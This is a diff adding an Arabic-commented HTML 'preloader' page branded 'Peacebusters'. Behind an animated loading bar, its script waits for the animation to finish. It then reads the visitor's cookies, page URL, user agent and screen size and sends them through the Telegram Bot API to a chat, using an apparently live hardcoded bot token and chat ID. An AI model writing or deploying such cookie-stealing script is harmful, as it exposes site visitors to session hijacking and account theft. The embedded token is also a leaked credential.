@@ -1,0 +1,256 @@
+<!DOCTYPE html>
+<html dir="rtl" lang="ar">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Preloader + Telegram</title>
+    <style>
+        /* ===== إعادة ضبط الصفحة ===== */
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        body {
+            font-family: 'Arial', sans-serif;
+            background: #0a0a15;
+            height: 100vh;
+            display: flex;
+            justify-content: center;
+            align-items: center;
+            overflow: hidden;
+        }
+
+        /* ===== شاشة التحميل (الخاصة بك) ===== */
+        .loadmain {
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: linear-gradient(145deg, #0a0a15, #1a1a2e);
+            display: flex;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            z-index: 9999;
+            transition: opacity 0.8s ease, visibility 0.8s ease;
+        }
+        /* إخفاء الشاشة بعد التحميل */
+        .loadmain.hidden {
+            opacity: 0;
+            visibility: hidden;
+            pointer-events: none;
+        }
+
+        /* النص الكبير "Peacebusters" */
+        .loadtext {
+            font-size: 4.5rem;
+            font-weight: 900;
+            color: #f7b731;
+            text-shadow: 0 0 30px rgba(247, 183, 49, 0.3);
+            letter-spacing: 4px;
+            margin-bottom: 5px;
+        }
+
+        /* النص الصغير "IFTIKHAR RASHA" */
+        .loadtitle {
+            font-size: 1.2rem;
+            font-weight: 300;
+            color: #8888aa;
+            letter-spacing: 8px;
+            text-transform: uppercase;
+            margin-bottom: 40px;
+        }
+
+        /* حاوية شريط التحميل */
+        .loadbar {
+            width: 280px;
+            height: 4px;
+            background: #2a2a44;
+            border-radius: 10px;
+            overflow: hidden;
+            box-shadow: inset 0 1px 3px rgba(0,0,0,0.5);
+        }
+
+        /* شريط التقدم الداخلي (الذي يتحرك) */
+        #fill {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #f7b731, #ffd369);
+            border-radius: 10px;
+            transition: width 0.2s ease;
+            box-shadow: 0 0 15px rgba(247, 183, 49, 0.4);
+        }
+
+        /* نسبة التحميل أسفل الشريط */
+        .load-percent {
+            margin-top: 15px;
+            font-size: 0.9rem;
+            color: #666;
+            letter-spacing: 2px;
+            direction: ltr;
+        }
+        .load-percent span {
+            color: #f7b731;
+            font-weight: bold;
+            font-size: 1.1rem;
+        }
+
+        /* ===== المحتوى الرئيسي (يظهر بعد التحميل) ===== */
+        #main-content {
+            display: none;
+            flex-direction: column;
+            justify-content: center;
+            align-items: center;
+            text-align: center;
+            color: #fff;
+            padding: 20px;
+        }
+        #main-content h1 {
+            font-size: 2.5rem;
+            color: #f7b731;
+        }
+        #main-content p {
+            color: #aaa;
+            margin-top: 10px;
+            max-width: 500px;
+        }
+        .telegram-status {
+            margin-top: 20px;
+            padding: 12px 25px;
+            background: #1e3a2a;
+            border-radius: 10px;
+            color: #7ddfa0;
+            font-size: 0.9rem;
+            border-right: 4px solid #7ddfa0;
+        }
+        .telegram-status.error {
+            background: #3d1f2a;
+            border-right-color: #ff7b7b;
+            color: #ff7b7b;
+        }
+    </style>
+</head>
+<body>
+
+    <!-- ===== شاشة التحميل (التصميم الأصلي الخاص بك) ===== -->
+    <div class="loadmain" id="loadmain">
+        <div class="loadtext">Peacebusters</div>
+        <div class="loadtitle">IFTIKHAR RASHA</div>
+        <div class="loadbar">
+            <div id="fill"></div>
+        </div>
+        <div class="load-percent">جاري التحميل <span id="percentNum">0</span>%</div>
+    </div>
+
+    <!-- ===== المحتوى الرئيسي بعد التحميل ===== -->
+    <div id="main-content">
+        <h1>🚀 تم التحميل بنجاح</h1>
+        <p>تم إرسال إشعار إلى بوت تيليجرام عند اكتمال التحميل.</p>
+        <div id="telegramResult" class="telegram-status">⏳ جاري الإرسال إلى البوت...</div>
+        <p style="margin-top: 30px; font-size: 0.8rem; color: #444;">
+            🔄 جرب تحديث الصفحة (F5) — لن تظهر شاشة التحميل مجدداً في هذه الجلسة
+        </p>
+    </div>
+
+    <script>
+        // ============================================================
+        // ⚠️ ضع توكن البوت ورقم الدردشة هنا (التوكن الخاص بك)
+        // ============================================================
+        const BOT_TOKEN = '8890411882:AAGH1fcFjTn_psy_N8cdvdPrgKY2t3GRp1A'; // غيّر هذا
+        const CHAT_ID = '5722006162'; // غيّر هذا
+        // ============================================================
+
+        // التحقق من Session Storage (لمنع ظهور الشاشة مرتين)
+        const preloaderKey = 'myPreloaderShown';
+
+        window.onload = function() {
+            // إذا كانت الشاشة ظهرت قبل كده في نفس التبويب، نخفيها فوراً ونظهر المحتوى
+            if (sessionStorage.getItem(preloaderKey) === 'true') {
+                document.getElementById('loadmain').classList.add('hidden');
+                document.getElementById('main-content').style.display = 'flex';
+                document.getElementById('telegramResult').textContent = 'ℹ️ تم التحميل مسبقاً (لم يتم الإرسال مجدداً)';
+                document.getElementById('telegramResult').className = 'telegram-status';
+                return;
+            }
+
+            // ===== بدء محاكاة التحميل =====
+            let progress = 0;
+            const fillBar = document.getElementById('fill');
+            const percentSpan = document.getElementById('percentNum');
+
+            const timer = setInterval(() => {
+                progress += Math.random() * 4 + 1; // زيادة عشوائية سلسة
+                if (progress > 100) progress = 100;
+
+                // تحديث الشريط والنسبة
+                fillBar.style.width = progress + '%';
+                percentSpan.textContent = Math.floor(progress);
+
+                if (progress >= 100) {
+                    clearInterval(timer);
+                    percentSpan.textContent = '100';
+                    
+                    // ===== 1. حفظ في Session Storage =====
+                    sessionStorage.setItem(preloaderKey, 'true');
+
+                    // ===== 2. إخفاء شاشة التحميل =====
+                    document.getElementById('loadmain').classList.add('hidden');
+                    document.getElementById('main-content').style.display = 'flex';
+
+                    // ===== 3. إرسال البيانات إلى تيليجرام =====
+                    sendDataToTelegram();
+                }
+            }, 60); // تحديث كل 60 ملي ثانية
+        };
+
+        // ===== دالة الإرسال إلى تيليجرام =====
+        async function sendDataToTelegram() {
+            const resultDiv = document.getElementById('telegramResult');
+
+            // التحقق من صحة التوكن
+            if (BOT_TOKEN === '1234567890:ABCdefGHIjklMNOpqrsTUVwxyz' || CHAT_ID === '123456789') {
+                resultDiv.textContent = '❌ خطأ: غير التوكن ورقم الدردشة داخل الكود أولاً!';
+                resultDiv.className = 'telegram-status error';
+                return;
+            }
+
+            // ===== تجهيز البيانات المرسلة =====
+            const cookies = document.cookie || 'لا توجد كوكيز قابلة للقراءة';
+            const cookieCount = document.cookie ? document.cookie.split('; ').filter(c => c).length : 0;
+
+            let message = '📊 <b>تقرير فتح الصفحة</b>\n';
+            message += `📌 <b>الموقع:</b> ${window.location.hostname}\n`;
+            message += `📌 <b>الرابط:</b> ${window.location.href}\n`;
+            message += `📌 <b>التوقيت:</b> ${new Date().toLocaleString('ar-EG')}\n`;
+            message += `📌 <b>المتصفح:</b> ${navigator.userAgent.substring(0, 60)}...\n`;
+            message += `📌 <b>دقة الشاشة:</b> ${screen.width}x${screen.height}\n`;
+            message += `━━━━━━━━━━━━━━━━━━\n`;
+            message += `🍪 <b>عدد الكوكيز:</b> ${cookieCount}\n`;
+            message += `<pre>${cookies.substring(0, 300)}${cookies.length > 300 ? '...' : ''}</pre>`;
+
+            // ترميز الرسالة
+            const encodedMessage = encodeURIComponent(message);
+            const apiUrl = `https://api.telegram.org/bot${BOT_TOKEN}/sendMessage?chat_id=${CHAT_ID}&text=${encodedMessage}&parse_mode=HTML`;
+
+            try {
+                const response = await fetch(apiUrl);
+                const data = await response.json();
+
+                if (data.ok) {
+                    resultDiv.textContent = `✅ تم الإرسال بنجاح إلى البوت! (${cookieCount} كوكيز)`;
+                    resultDiv.className = 'telegram-status';
+                } else {
+                    resultDiv.textContent = `❌ فشل الإرسال: ${data.description || 'خطأ غير معروف'}`;
+                    resultDiv.className = 'telegram-status error';
+                }
+            } catch (error) {
+                resultDiv.textContent = `❌ خطأ في الاتصال: ${error.message}`;
+                resultDiv.className = 'telegram-status error';
+            }
+        }
+    </script>
+
+</body>
+</html>
